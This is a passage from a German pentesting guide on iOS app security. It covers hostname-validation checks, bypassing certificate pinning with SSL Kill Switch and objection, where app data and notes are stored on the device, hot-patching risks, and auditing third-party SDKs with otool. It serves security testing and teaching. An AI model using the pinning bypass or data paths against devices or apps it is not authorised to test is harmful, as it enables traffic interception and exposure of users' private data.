Ein h√§ufiges Problem bei der Validierung des TLS-Zertifikats besteht darin, zu √ºberpr√ºfen, ob das Zertifikat von einer **vertrauensw√ºrdigen** **CA** signiert wurde, aber **nicht zu √ºberpr√ºfen**, ob **der Hostname** des Zertifikats der aufgerufene Hostname ist.\
Um dieses Problem mit Burp zu √ºberpr√ºfen, k√∂nnen Sie, nachdem Sie die Burp CA auf dem iPhone vertraut haben, **ein neues Zertifikat mit Burp f√ºr einen anderen Hostnamen erstellen** und es verwenden. Wenn die Anwendung weiterhin funktioniert, ist sie anf√§llig.

### Zertifikat-Pinning

Wenn eine Anwendung SSL-Pinning korrekt verwendet, funktioniert die Anwendung nur, wenn das Zertifikat das erwartete ist. Bei der Pr√ºfung einer Anwendung **kann dies ein Problem sein, da Burp sein eigenes Zertifikat bereitstellt.**\
Um diesen Schutz auf einem jailbroken Ger√§t zu umgehen, k√∂nnen Sie die Anwendung [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) installieren oder [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) installieren.

Sie k√∂nnen auch **objection's** `ios sslpinning disable` verwenden.

## Sonstiges

* In **`/System/Library`** finden Sie die Frameworks, die auf dem Telefon von Systemanwendungen verwendet werden.
* Die vom Benutzer aus dem App Store installierten Anwendungen befinden sich in **`/User/Applications`**.
* Und **`/User/Library`** enth√§lt Daten, die von benutzerebene Anwendungen gespeichert wurden.
* Sie k√∂nnen auf **`/User/Library/Notes/notes.sqlite`** zugreifen, um die in der Anwendung gespeicherten Notizen zu lesen.
* Im Ordner einer installierten Anwendung (**`/User/Applications/<APP ID>/`**) finden Sie einige interessante Dateien:
* **`iTunesArtwork`**: Das von der App verwendete Symbol.
* **`iTunesMetadata.plist`**: Informationen zur App, die im App Store verwendet werden.
* **`/Library/*`**: Enth√§lt die Einstellungen und den Cache. In **`/Library/Cache/Snapshots/*`** finden Sie den Snapshot, der vor dem Senden der Anwendung in den Hintergrund erstellt wurde.

### Hot Patching/Erzwungene Aktualisierung

Die Entwickler k√∂nnen **alle Installationen ihrer App sofort remote patchen**, ohne die Anwendung erneut im App Store einreichen und auf die Genehmigung warten zu m√ºssen.\
Zu diesem Zweck wird normalerweise [**JSPatch**](https://github.com/bang590/JSPatch)** verwendet.** Es gibt jedoch auch andere Optionen wie [Siren](https://github.com/ArtSabintsev/Siren) und [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Dies ist ein gef√§hrlicher Mechanismus, der von b√∂swilligen Drittanbieter-SDKs missbraucht werden k√∂nnte, daher wird empfohlen, zu √ºberpr√ºfen, welche Methode f√ºr automatische Aktualisierungen verwendet wird (falls vorhanden) und diese zu testen.** Sie k√∂nnten versuchen, eine fr√ºhere Version der App zu diesem Zweck herunterzuladen.

### Drittanbieter

Eine erhebliche Herausforderung bei **3rd Party SDKs** ist die **fehlende granulare Kontrolle** √ºber ihre Funktionen. Entwickler stehen vor der Wahl: entweder das SDK zu integrieren und alle seine Funktionen zu akzeptieren, einschlie√ülich potenzieller Sicherheitsanf√§lligkeiten und Datenschutzbedenken, oder ganz auf seine Vorteile zu verzichten. Oft sind Entwickler nicht in der Lage, Sicherheitsanf√§lligkeiten innerhalb dieser SDKs selbst zu patchen. Dar√ºber hinaus k√∂nnen einige SDKs, die innerhalb der Community Vertrauen gewinnen, Malware enthalten.

Die von Drittanbieter-SDKs bereitgestellten Dienste k√∂nnen das Tracking des Benutzerverhaltens, die Anzeige von Werbung oder die Verbesserung der Benutzererfahrung umfassen. Dies birgt jedoch ein Risiko, da Entwickler m√∂glicherweise nicht vollst√§ndig √ºber den von diesen Bibliotheken ausgef√ºhrten Code informiert sind, was zu potenziellen Datenschutz- und Sicherheitsrisiken f√ºhren kann. Es ist entscheidend, die mit Drittanbieterdiensten geteilten Informationen auf das Notwendige zu beschr√§nken und sicherzustellen, dass keine sensiblen Daten offengelegt werden.

Die Implementierung von Drittanbieterdiensten erfolgt normalerweise in zwei Formen: einer eigenst√§ndigen Bibliothek oder einem vollst√§ndigen SDK. Um die Privatsph√§re der Benutzer zu sch√ºtzen, sollten alle mit diesen Diensten geteilten Daten **anonymisiert** werden, um die Offenlegung von personenbezogenen Daten (PII) zu verhindern.

Um die Bibliotheken zu identifizieren, die eine Anwendung verwendet, kann der Befehl **`otool`** verwendet werden. Dieses Tool sollte gegen die Anwendung und jede von ihr verwendete gemeinsame Bibliothek ausgef√ºhrt werden, um zus√§tzliche Bibliotheken zu entdecken.
```bash
otool -L <application_path>
```
## **Referenzen & Weitere Ressourcen**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS kostenloser Kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C-Version [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift-Version
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}
{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
</details>
{% endhint %}
